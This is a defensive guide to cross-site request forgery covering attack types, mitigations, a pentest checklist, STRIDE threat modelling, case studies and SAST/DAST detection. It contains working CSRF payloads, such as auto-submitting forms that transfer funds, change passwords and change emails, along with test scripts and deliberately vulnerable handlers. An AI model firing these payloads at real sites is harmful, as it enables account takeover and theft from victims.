# CSRF (Cross-Site Request Forgery) - Comprehensive Guide

## **Introduction**

CSRF (Cross-Site Request Forgery) is a security vulnerability that allows attackers to trick authenticated users into performing unwanted actions on a web application. It ranks in OWASP Top 10 and is a critical web application security risk.

### **What CSRF is Used For**

Attackers use CSRF to:

- **Perform unauthorized actions** on behalf of authenticated users
- **Change account settings** without user consent
- **Transfer funds** or make purchases
- **Delete data** or modify records
- **Escalate privileges** or change permissions

### **Why CSRF is Dangerous**

**Severity:**

- ✅ **High Impact**: Can lead to unauthorized actions
- ✅ **Common**: Found in many applications
- ✅ **Hard to Detect**: Victims may not notice
- ✅ **Exploits Trust**: Uses legitimate user sessions
- ✅ **Widespread**: Affects all state-changing operations

---

## **What is CSRF**

CSRF (Cross-Site Request Forgery) is an attack that tricks a user's browser into making requests to a web application where the user is authenticated, causing the application to perform actions the user didn't intend.

### **Basic Example**

**Vulnerable Application:**

```
User is logged into bank.com
Session cookie: sessionId=abc123

```

**Attack:**

```html
<!-- Attacker's malicious page (evil.com) -->
<form id="transfer" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('transfer').submit();</script>

```

**Result:**

- Browser automatically includes session cookie
- Bank.com processes transfer as legitimate user request
- Attacker receives funds

---

## **How CSRF Works**

### **Attack Flow**

1. **User is Authenticated:**
    - User logs into target application (bank.com)
    - Application sets session cookie
    - Cookie stored in browser
2. **User Visits Attacker's Site:**
    - User visits malicious site (evil.com)
    - While still logged into bank.com
3. **Malicious Request is Triggered:**
    - Attacker's page contains form/script
    - Form submits to bank.com
    - Browser automatically includes session cookie
4. **Application Processes Request:**
    - Application sees valid session cookie
    - Treats request as legitimate
    - Performs action (transfer, delete, etc.)

### **Key Requirements**

- ✅ User must be authenticated
- ✅ Application must trust session cookies
- ✅ Attacker must know/can predict the request format
- ✅ No CSRF protection in place

---

## **Types of CSRF Attacks**

### **1. GET-Based CSRF**

**Description:** State-changing operations via GET requests (violates REST principles but still common).

**Attack:**

```html
<!-- Dangerous GET request -->
<img src="https://bank.com/delete?id=123" />

<!-- Or link -->
<a href="https://bank.com/transfer?to=attacker&amount=1000">Click here</a>

```

**Mitigation:**

- Never use GET for state-changing operations
- Use POST/PUT/DELETE instead
- Implement CSRF tokens for all state-changing operations

### **2. POST-Based CSRF**

**Description:** Most common type - form submission to POST endpoints.

**Attack:**

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

```

**Mitigation:**

- CSRF tokens in forms
- SameSite cookies
- Origin/Referer validation

### **3. JSON-Based CSRF**

**Description:** CSRF via JSON requests (less common but possible).

**Attack:**

```jsx
// Attacker's script
fetch('https://api.bank.com/transfer', {
  method: 'POST',
  credentials: 'include',  // Includes cookies
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    to: 'attacker_account',
    amount: 10000
  })
});

```

**Mitigation:**

- CSRF tokens in custom headers (X-CSRF-Token)
- Origin header validation
- Content-Type validation

---

## **Impact of CSRF**

### **1. Unauthorized Actions**

**Confidentiality Impact:**

- Change email addresses
- Modify account settings
- Update security questions
- Change passwords (account takeover)

**Example:**

```html
<!-- Change email to attacker's email -->
<form action="https://app.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>

```

### **2. Financial Fraud**

**Integrity Impact:**

- Transfer funds
- Make purchases
- Modify payment methods
- Change billing information

**Example:**

```html
<!-- Transfer funds -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>

```

### **3. Data Manipulation**

**Integrity Impact:**

- Delete data
- Modify records
- Change permissions
- Update configurations

**Example:**

```html
<!-- Delete account -->
<form action="https://app.com/delete-account" method="POST">
  <input type="hidden" name="confirm" value="true" />
</form>

```

### **4. Privilege Escalation**

**Impact:**

- Grant admin permissions
- Add users to admin groups
- Change user roles
- Enable dangerous features

---

## **Mitigation Strategies**

### **1. CSRF Tokens (Primary Defense)**

**How It Works:**

- Server generates unique token per session
- Token included in forms/requests
- Server validates token before processing

**Implementation:**

```python
# Generate token
import secrets
csrf_token = secrets.token_urlsafe(32)

# Store in session
session['csrf_token'] = csrf_token

# Include in form
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
  <!-- ... -->
</form>

# Validate on server
if request.form['csrf_token'] != session['csrf_token']:
    return "Invalid CSRF token", 403

```

**Best Practices:**

- Use cryptographically random tokens
- Store tokens in server-side session
- Validate tokens on every state-changing request
- Regenerate tokens periodically

### **2. SameSite Cookie Attribute**

**How It Works:**

- Prevents cookies from being sent in cross-site requests
- SameSite=Strict: Never sent cross-site
- SameSite=Lax: Sent with top-level navigation

**Implementation:**

```python
# SameSite=Strict (most secure)
response.set_cookie(
    'sessionId',
    value='abc123',
    samesite='Strict',
    secure=True,
    httponly=True
)

# SameSite=Lax (balanced)
response.set_cookie(
    'sessionId',
    value='abc123',
    samesite='Lax',  # Allows GET requests from links
    secure=True,
    httponly=True
)

```

**Limitations:**

- Not supported by all browsers
- May break legitimate cross-site flows
- Use with CSRF tokens for maximum protection

### **3. Origin/Referer Header Validation**

**How It Works:**

- Validates that request comes from expected origin
- Rejects requests from unexpected origins

**Implementation:**

```python
def validate_origin(request):
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')

    expected_origin = 'https://bank.com'

    # Validate Origin header
    if origin and origin != expected_origin:
        return False

    # Validate Referer header
    if referer and not referer.startswith(expected_origin):
        return False

    return True

```

**Limitations:**

- Referer can be stripped by privacy tools
- Origin may not be present in all requests
- Use as additional layer, not primary defense

### **4. Custom Headers**

**How It Works:**

- Requires custom header (e.g., X-Requested-With)
- Browsers don't send custom headers cross-origin (same-origin policy)

**Implementation:**

```jsx
// Client-side
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({...})
});

// Server-side validation
if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
    return "Invalid request", 403

```

**Limitations:**

- Only works for AJAX requests
- Can be bypassed with Flash/plugins
- Use with other controls

### **5. Double Submit Cookie Pattern**

**How It Works:**

- Cookie and form field contain same token
- Server compares cookie value with form value
- Must match for request to be valid

**Implementation:**

```python
# Set cookie with token
token = secrets.token_urlsafe(32)
response.set_cookie('csrf_token', token)

# Include same token in form
<form>
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
</form>

# Validate
if request.cookies.get('csrf_token') != request.form.get('csrf_token'):
    return "Invalid CSRF token", 403

```

---

## **Best Practices**

### **1. Always Use CSRF Tokens for State-Changing Operations**

**Rule:** Protect all POST, PUT, DELETE, and PATCH requests.

**✅ CORRECT:**

```python
# Generate token
csrf_token = generate_csrf_token()
session['csrf_token'] = csrf_token

# Include in form
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
  <!-- ... -->
</form>

# Validate
validate_csrf_token(request.form['csrf_token'], session['csrf_token'])

```

### **2. Use SameSite Cookies**

**Rule:** Set SameSite attribute on session cookies.

**✅ CORRECT:**

```python
response.set_cookie(
    'sessionId',
    value=session_id,
    samesite='Strict',  # or 'Lax'
    secure=True,
    httponly=True
)

```

### **3. Validate Origin/Referer Headers**

**Rule:** Check Origin/Referer as additional layer.

**✅ CORRECT:**

```python
def validate_request_origin(request):
    origin = request.headers.get('Origin')
    if origin and origin not in ALLOWED_ORIGINS:
        raise CSRFError("Invalid origin")

```

### **4. Never Use GET for State-Changing Operations**

**Rule:** Follow REST principles - GET should be idempotent and safe.

**❌ WRONG:**

```python
@app.route('/delete')
def delete():
    # Dangerous: State-changing GET
    delete_item(request.args.get('id'))

```

**✅ CORRECT:**

```python
@app.route('/delete', methods=['POST'])
def delete():
    validate_csrf_token(request.form['csrf_token'])
    delete_item(request.form['id'])

```

### **5. Use Defense in Depth**

**Rule:** Combine multiple mitigation techniques.

**✅ CORRECT:**

- CSRF tokens (primary)
- SameSite cookies (secondary)
- Origin validation (tertiary)
- Custom headers (for AJAX)

---

## **Advanced Exploitation Techniques**

### **1. Bypassing CSRF Token Validation**

**Technique: Weak Token Generation**

```python
# ❌ VULNERABLE: Predictable token
import time
csrf_token = str(int(time.time()))  # Predictable!

# ✅ SECURE: Cryptographically random
import secrets
csrf_token = secrets.token_urlsafe(32)

```

**Technique: Token in Cookie (Double Submit)**

```python
# If token stored in cookie and validated incorrectly
# Attacker can set cookie via subdomain
document.cookie = "csrf_token=attacker_value; domain=.example.com";

```

### **2. Bypassing SameSite Protection**

**Technique: Top-Level Navigation (SameSite=Lax)**

```html
<!-- SameSite=Lax allows GET requests from links -->
<a href="https://bank.com/transfer?to=attacker&amount=1000">Click here</a>

```

**Mitigation:**

- Never use GET for state-changing operations
- Use SameSite=Strict for sensitive operations

### **3. JSON CSRF Bypass**

**Technique: Using Fetch API**

```jsx
// If server doesn't validate Content-Type
fetch('https://api.example.com/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({to: 'attacker', amount: 1000})
});

```

**Mitigation:**

- Validate Content-Type header
- Require CSRF token in custom header
- Use Origin validation

### **4. Flash-Based CSRF**

**Technique: Flash can send custom headers**

```
// Flash can bypass same-origin policy
var request:URLRequest = new URLRequest("https://bank.com/transfer");
request.requestHeaders.push(new URLRequestHeader("X-Requested-With", "XMLHttpRequest"));

```

**Mitigation:**

- Flash is deprecated, but if used, validate tokens
- Don't rely solely on custom headers

---

## **Penetration Testing Methodology**

### **CSRF Testing Checklist**

**1. Identify State-Changing Operations:**

- POST requests (forms, API calls)
- PUT/DELETE requests
- Any operation that modifies data

**2. Check for CSRF Protection:**

- Look for CSRF tokens in forms
- Check SameSite cookie attribute
- Verify Origin/Referer validation
- Test custom headers requirement

**3. Test CSRF Vulnerability:**

```html
<!-- Create malicious HTML page -->
<form id="csrf" action="https://target.com/vulnerable-endpoint" method="POST">
  <input type="hidden" name="param" value="malicious_value" />
</form>
<script>document.getElementById('csrf').submit();</script>

```

**4. Validate Exploitation:**

- Request succeeds without user interaction
- Action is performed (email changed, funds transferred, etc.)
- No error messages about CSRF protection

### **Testing Tools**

**1. Burp Suite:**

- Generate CSRF PoC automatically
- Test for CSRF protection
- Validate token implementation

**2. OWASP ZAP:**

- Automated CSRF detection
- CSRF token analysis
- Origin/Referer validation testing

**3. Custom Scripts:**

```python
import requests

def test_csrf(target_url, session_cookie):
    # Create malicious form
    payload = {
        'email': 'attacker@evil.com'
    }

    headers = {
        'Cookie': session_cookie,
        'Referer': 'https://evil.com'
    }

    response = requests.post(target_url, data=payload, headers=headers)
    return response.status_code == 200

```

### **Common Findings in Penetration Tests**

**1. Missing CSRF Tokens:**

- **Finding**: Forms/API endpoints without CSRF tokens
- **Risk**: High
- **Evidence**: POST request succeeds without token

**2. Weak Token Implementation:**

- **Finding**: Predictable or reusable tokens
- **Risk**: High
- **Evidence**: Token can be predicted or reused

**3. SameSite Not Set:**

- **Finding**: Session cookies without SameSite attribute
- **Risk**: Medium
- **Evidence**: Cookie sent with cross-site requests

**4. No Origin Validation:**

- **Finding**: Server doesn't validate Origin/Referer
- **Risk**: Medium
- **Evidence**: Requests from different origins accepted

---

## **Threat Modeling (STRIDE Framework)**

### **Spoofing**

**Threat:** Attacker spoofs legitimate user requests.

**Attack Vectors:**

- Cross-site form submission
- Image tag GET requests
- Fetch API requests
- Flash-based requests

**Mitigation:**

- CSRF tokens
- SameSite cookies
- Origin validation

**Risk Rating:** High

### **Tampering**

**Threat:** Attacker modifies user data without authorization.

**Attack Vectors:**

- Change email/password
- Modify account settings
- Update permissions

**Mitigation:**

- CSRF tokens
- Request validation
- Audit logging

**Risk Rating:** High

### **Repudiation**

**Threat:** User denies performing actions (no audit trail).

**Attack Vectors:**

- Actions performed via CSRF
- No proper logging
- User claims they didn't do it

**Mitigation:**

- Comprehensive logging
- Request correlation
- User notifications

**Risk Rating:** Medium

### **Information Disclosure**

**Threat:** Attacker accesses sensitive information via CSRF.

**Attack Vectors:**

- Change email to attacker's email
- Modify account to access data
- Change settings to expose information

**Mitigation:**

- CSRF protection
- Access controls
- Data encryption

**Risk Rating:** Medium

### **Denial of Service**

**Threat:** Attacker causes service disruption via CSRF.

**Attack Vectors:**

- Delete critical data
- Disable accounts
- Modify configurations

**Mitigation:**

- CSRF protection
- Confirmation requirements
- Rate limiting

**Risk Rating:** Medium

### **Elevation of Privilege**

**Threat:** Attacker escalates privileges via CSRF.

**Attack Vectors:**

- Grant admin permissions
- Add to admin groups
- Enable dangerous features

**Mitigation:**

- CSRF protection
- Authorization checks
- Privilege validation

**Risk Rating:** High

### **Attack Tree: CSRF Account Takeover**

```
CSRF Account Takeover
├── Change Email
│   ├── Form submission to /change-email
│   ├── No CSRF token validation
│   └── Email changed to attacker's email
├── Change Password
│   ├── Form submission to /change-password
│   ├── No CSRF token validation
│   └── Password changed
└── Modify Security Settings
    ├── Form submission to /security-settings
    ├── No CSRF token validation
    └── Security questions changed

```

---

## **Real-World Case Studies**

### **Case Study 1: CSRF in Password Change**

**Background:** During a penetration test, we discovered CSRF vulnerability in password change functionality.

**Discovery:**

```html
<!-- Vulnerable password change form -->
<form action="/change-password" method="POST">
  <input type="password" name="new_password" />
  <input type="password" name="confirm_password" />
  <!-- No CSRF token! -->
</form>

```

**Exploitation:**

```html
<!-- Attacker's malicious page -->
<form id="pwchange" action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="attacker_password" />
  <input type="hidden" name="confirm_password" value="attacker_password" />
</form>
<script>document.getElementById('pwchange').submit();</script>

```

**Impact:**

- **Confidentiality**: Critical - Account takeover
- **Integrity**: Critical - Attacker controls account
- **Availability**: High - Original user locked out
- **Business Impact**: Critical - Complete account compromise

**Root Cause:**

- No CSRF token validation
- No SameSite cookie protection
- No Origin/Referer validation

**Remediation:**

```python
# Fixed implementation
@app.route('/change-password', methods=['POST'])
def change_password():
    # Validate CSRF token
    if request.form['csrf_token'] != session['csrf_token']:
        return "Invalid CSRF token", 403

    # Validate Origin
    if request.headers.get('Origin') != 'https://target.com':
        return "Invalid origin", 403

    # Change password
    change_password(request.form['new_password'])

```

---

### **Case Study 2: CSRF in Fund Transfer**

**Background:** Security assessment revealed CSRF in banking application transfer functionality.

**Discovery:**

```python
# Vulnerable endpoint
@app.route('/transfer', methods=['POST'])
def transfer():
    # No CSRF validation!
    to_account = request.form['to']
    amount = request.form['amount']
    transfer_funds(to_account, amount)

```

**Exploitation:**

```html
<!-- Attacker's page -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

```

**Impact:**

- **Financial**: Critical - Direct monetary loss
- **Integrity**: Critical - Unauthorized transactions
- **Business Impact**: Critical - Financial fraud, regulatory violations

**Remediation:**

```python
# Fixed implementation
@app.route('/transfer', methods=['POST'])
def transfer():
    # Validate CSRF token
    validate_csrf_token(request.form['csrf_token'])

    # Validate Origin
    validate_origin(request.headers.get('Origin'))

    # Additional confirmation for large amounts
    if request.form['amount'] > 1000:
        require_additional_confirmation()

    transfer_funds(request.form['to'], request.form['amount'])

```

---

## **Advanced Mitigations**

### **Defense in Depth Strategy**

**Layer 1: CSRF Tokens**

```python
# Generate secure token
csrf_token = secrets.token_urlsafe(32)
session['csrf_token'] = csrf_token

# Validate token
if request.form.get('csrf_token') != session.get('csrf_token'):
    raise CSRFError("Invalid CSRF token")

```

**Layer 2: SameSite Cookies**

```python
response.set_cookie(
    'sessionId',
    value=session_id,
    samesite='Strict',
    secure=True,
    httponly=True
)

```

**Layer 3: Origin Validation**

```python
def validate_origin(request):
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')

    allowed_origins = ['https://app.com']

    if origin and origin not in allowed_origins:
        raise CSRFError("Invalid origin")

    if referer and not any(ref.startswith(origin) for origin in allowed_origins):
        raise CSRFError("Invalid referer")

```

**Layer 4: Custom Headers (for AJAX)**

```jsx
// Require custom header
fetch('/api/endpoint', {
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-CSRF-Token': csrfToken
  }
});

```

**Layer 5: Additional Confirmation**

```python
# For sensitive operations
if operation_is_sensitive(request):
    require_captcha()
    require_email_confirmation()
    require_2fa()

```

---

## **SAST/DAST Detection**

### **SAST (Static Application Security Testing)**

**Vulnerable Code Patterns:**

**1. Missing CSRF Token Validation:**

```python
# ❌ VULNERABLE
@app.route('/transfer', methods=['POST'])
def transfer():
    # No CSRF token check
    transfer_funds(request.form['to'], request.form['amount'])

# SAST Detection:
# - Pattern: POST handler without CSRF validation
# - Severity: High
# - CWE: CWE-352 (Cross-Site Request Forgery)

```

**2. Weak Token Generation:**

```python
# ❌ VULNERABLE
csrf_token = str(time.time())  # Predictable!

# ✅ SECURE
csrf_token = secrets.token_urlsafe(32)

# SAST Detection:
# - Pattern: Predictable token generation
# - Severity: High
# - CWE: CWE-330 (Use of Insufficiently Random Values)

```

**3. Missing SameSite Attribute:**

```python
# ❌ VULNERABLE
response.set_cookie('sessionId', session_id)

# ✅ SECURE
response.set_cookie('sessionId', session_id, samesite='Strict')

# SAST Detection:
# - Pattern: Cookie without SameSite attribute
# - Severity: Medium
# - CWE: CWE-352

```

### **DAST (Dynamic Application Security Testing)**

**Testing Methodology:**

**1. Identify State-Changing Endpoints:**

```bash
# Find POST/PUT/DELETE endpoints
grep -r "method.*POST" target_app/

```

**2. Test for CSRF Protection:**

```bash
# Submit request without CSRF token
curl -X POST https://target.com/endpoint \
  -H "Cookie: sessionId=abc123" \
  -d "param=value"

# If succeeds, vulnerable to CSRF

```

**3. Generate CSRF PoC:**

```html
<!-- Burp Suite generates this automatically -->
<form action="https://target.com/vulnerable-endpoint" method="POST">
  <input type="hidden" name="param" value="malicious_value" />
</form>
<script>document.forms[0].submit();</script>

```

**Common DAST Findings:**

- Missing CSRF tokens in forms
- No SameSite cookie protection
- Origin/Referer not validated
- Weak token implementation
- GET requests for state-changing operations

---

## **Risk Assessment**

### **Risk Matrix**

| Vulnerability | Likelihood | Impact | Risk Level | Business Impact |
| --- | --- | --- | --- | --- |
| **Missing CSRF Protection** | High | Critical | **Critical** | Unauthorized actions, account takeover |
| **Weak Token Implementation** | Medium | High | **High** | Token prediction/reuse possible |
| **No SameSite Protection** | High | High | **High** | Cross-site cookie sending |
| **GET for State Changes** | Medium | High | **High** | Accidental/intentional data modification |
| **No Origin Validation** | Medium | Medium | **Medium** | Reduced protection layer |

### **Risk Calculation**

**Formula:**

```
Risk = Likelihood × Impact

```

**Example: Missing CSRF Protection**

**Likelihood:** High (0.8)

- Common vulnerability
- Easy to exploit
- No protection in place

**Impact:** Critical (1.0)

- Account takeover
- Financial fraud
- Data manipulation
- Unauthorized actions

**Risk Score:** 0.8 × 1.0 = **0.8 (Critical Risk)**

**Business Impact:**

- **Financial**: Direct monetary losses, fraud
- **Reputation**: Loss of customer trust
- **Legal**: Regulatory violations, liability
- **Operational**: Service disruption, incident response

### **Risk Prioritization**

**Critical (Immediate Action):**

- Missing CSRF protection on sensitive operations
- Password change without CSRF protection
- Fund transfer without CSRF protection

**High (Urgent Action):**

- Weak token implementation
- No SameSite protection
- GET for state-changing operations

**Medium (Planned Action):**

- Missing Origin validation
- Incomplete CSRF protection
- Limited scope protection

---

## **Summary**

CSRF is a critical web application vulnerability. Key points to remember:

1. **Always use CSRF tokens** for state-changing operations
2. **Use SameSite cookies** as additional protection
3. **Validate Origin/Referer** headers
4. **Never use GET** for state-changing operations
5. **Implement defense in depth** - multiple layers
6. **Use secure token generation** - cryptographically random
7. **Test regularly** - code reviews, penetration testing
8. **Follow security standards** - OWASP guidelines

Remember: **CSRF is prevented by verifying request origin (CSRF tokens, SameSite cookies, Origin/Referer validation), not by HTTPS or HttpOnly alone!**